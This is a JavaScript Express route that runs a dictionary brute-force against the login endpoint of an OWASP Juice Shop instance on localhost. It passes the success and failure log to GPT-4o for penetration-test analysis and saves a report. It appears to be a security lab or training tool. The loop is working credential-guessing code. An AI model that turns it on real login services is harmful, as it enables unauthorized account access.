const express = require('express');
const router = express.Router();
const { getAIClient, saveReport, timestamp } = require('../lib/aiClient');
const store = require('../lib/store');

async function runHydraScan() {
    const users = ['admin@juice-sh.op', 'user@juice-sh.op', 'test@test.com', 'admin@admin.com', 'bender@juice-sh.op'];
    const passwords = ['admin123', 'password', '123456', 'admin', 'test', 'juice', 'Owasp123'];
    let output = `Testing ${users.length * passwords.length} combinations...\n`;
    let found = [];

    for (const user of users) {
        for (const pass of passwords) {
            try {
                const response = await fetch('http://localhost:8080/rest/user/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email: user, password: pass })
                });
                if (response.status === 200) {
                    const data = await response.json();
                    if (data.authentication?.token) {
                        found.push({ user, pass });
                        output += `[SUCCESS] ${user}:${pass}\n`;
                    }
                } else {
                    output += `[FAIL] ${user}:${pass} (${response.status})\n`;
                }
            } catch (e) {
                output += `[ERROR] ${user}:${pass} - ${e.message}\n`;
            }
        }
    }
    output += `\nCompleted: ${found.length} valid credentials found`;
    return { rawOutput: output, testedCombinations: users.length * passwords.length, found };
}

router.post('/', async (req, res) => {
    try {
        const hydraResults = await runHydraScan();
        const client = getAIClient();
        const response = await client.chat.completions.create({
            messages: [
                { role: 'system', content: 'You are a penetration testing expert. Analyze the Hydra brute-force attack output. Focus on: 1) Credentials tested, 2) Success/failure results, 3) Authentication vulnerabilities found.' },
                { role: 'user', content: `Analyze this Hydra attack output against juice-shop:\n\n${hydraResults.rawOutput}\n\nProvide specific findings from THIS test.` }
            ],
            temperature: 0.3, max_tokens: 1000, model: 'gpt-4o'
        });

        const analysis = response.choices[0].message.content;
        const filename = saveReport(`hydra-analysis_${timestamp()}.md`, `# Brute-Force Analysis\n\n**Generated:** ${new Date().toLocaleString()}\n**Combinations Tested:** ${hydraResults.testedCombinations}\n**Valid Credentials Found:** ${hydraResults.found.length}\n\n## AI Analysis\n\n${analysis}\n\n## Attack Output\n\n\`\`\`\n${hydraResults.rawOutput}\n\`\`\``);

        store.hydraScan = analysis;
        res.json({ success: true, analysis, reportFile: filename, timestamp: new Date().toLocaleString() });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

module.exports = router;
